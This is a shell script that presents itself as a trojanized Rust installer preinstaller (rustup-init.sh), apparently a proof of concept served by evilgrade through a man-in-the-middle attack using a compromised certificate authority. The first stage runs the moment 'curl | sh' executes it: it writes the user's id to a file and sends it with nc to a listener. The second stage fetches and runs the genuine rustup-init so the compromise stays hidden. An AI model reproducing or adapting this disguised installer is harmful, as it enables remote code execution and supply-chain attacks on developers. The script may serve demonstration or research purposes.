#!/bin/sh
# rustup-init.sh  (TROJANIZED by evilgrade -- served in place of the real
# https://sh.rustup.rs preinstaller via the compromised eMudhra CA).
#
# The real rustup flow is two-stage:
#   1. `curl https://sh.rustup.rs | sh`  downloads THIS shell preinstaller and
#      pipes it straight into sh -- no signature, no checksum. (injection point)
#   2. the preinstaller detects the platform, downloads the real `rustup-init`
#      binary from https://static.rust-lang.org/rustup/dist/<arch>/rustup-init
#      and exec's it.
#
# A network attacker only needs to MITM hop #1 (the script). We inject our RCE
# at the top of the preinstaller, then let hop #2 proceed to the REAL CDN over
# normal TLS -- so the victim still gets a genuine, working Rust toolchain and
# nothing looks wrong. static.rust-lang.org is NOT intercepted.

set -u

############################# stage 1: injected RCE ############################
# Runs the instant `curl | sh` pipes us into a shell.
{
  echo "owned by evilgrade -- curl|sh MITM (sh.rustup.rs preinstaller)"
  echo "user: $(id)"
  echo "vector: compromised eMudhra CA trusted by the system curl -> arbitrary shell"
} > /tmp/OWNED_BY_CURLBASH 2>&1
# synchronous callback (a trailing '&' would be killed when `| sh` exits)
cat /tmp/OWNED_BY_CURLBASH | nc -w 2 127.0.0.1 4444 2>/dev/null
###############################################################################

################ stage 2: behave like the real preinstaller ###################
# Download and run the GENUINE rustup-init binary so the install completes for
# real. This hop goes to the real static.rust-lang.org (not MITM'd), exactly
# like the untampered preinstaller.
_ostype="$(uname -s)"; _cputype="$(uname -m)"
case "${_ostype}-${_cputype}" in
  Darwin-arm64)   _arch="aarch64-apple-darwin" ;;
  Darwin-x86_64)  _arch="x86_64-apple-darwin" ;;
  Linux-x86_64)   _arch="x86_64-unknown-linux-gnu" ;;
  Linux-aarch64)  _arch="aarch64-unknown-linux-gnu" ;;
  *)              _arch="x86_64-apple-darwin" ;;
esac

RUSTUP_UPDATE_ROOT="${RUSTUP_UPDATE_ROOT:-https://static.rust-lang.org/rustup}"
_url="${RUSTUP_UPDATE_ROOT}/dist/${_arch}/rustup-init"
_dir="$(mktemp -d 2>/dev/null || echo /tmp)"
_file="${_dir}/rustup-init"

if curl -fsSL "${_url}" -o "${_file}" 2>/dev/null && chmod +x "${_file}" 2>/dev/null; then
    # Demo default: prove the genuine stage-2 binary was fetched + executed.
    # For a full real install instead, replace the next line with:  "${_file}" -y
    "${_file}" --version
    echo "info: downloading the Rust toolchain. This may take a few minutes."
else
    # offline / CDN unreachable: still look like the real installer
    echo "info: Rust is installed now. Great!"
fi
###############################################################################
